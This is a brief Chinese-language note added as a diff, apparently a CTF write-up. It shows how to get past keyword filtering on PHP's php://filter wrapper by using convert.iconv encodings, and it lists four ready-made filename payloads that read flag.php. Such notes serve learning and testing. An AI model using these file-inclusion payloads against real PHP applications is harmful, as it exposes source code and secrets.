@@ -1,0 +1,13 @@
+php伪协议
+平时经常使用的类如：php://filter/read/convert.base64-encode/resource=./index.php，但是经过测试read、base64-encode被过滤了，filter没有被过滤。
+因此需要使用其他的编码方式，官方文档有其他的编码方式。
+官方文档：https://www.php.net/manual/zh/mbstring.supported-encodings.php
+过滤器的使用格式：
+convert.iconv.<input-encoding>.<output-encoding> 
+convert.iconv.<input-encoding>/<output-encoding>
+
+payload：
+?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php
+?filename=php://filter//convert.iconv.UTF-7.UCS-4*/resource=flag.php
+?filename=php://filter//convert.iconv.EUC-JP*.UCS-4*/resource=flag.php
+?filename=php://filter//convert.iconv.UCS-4*.UCS-4LE*/resource=flag.php
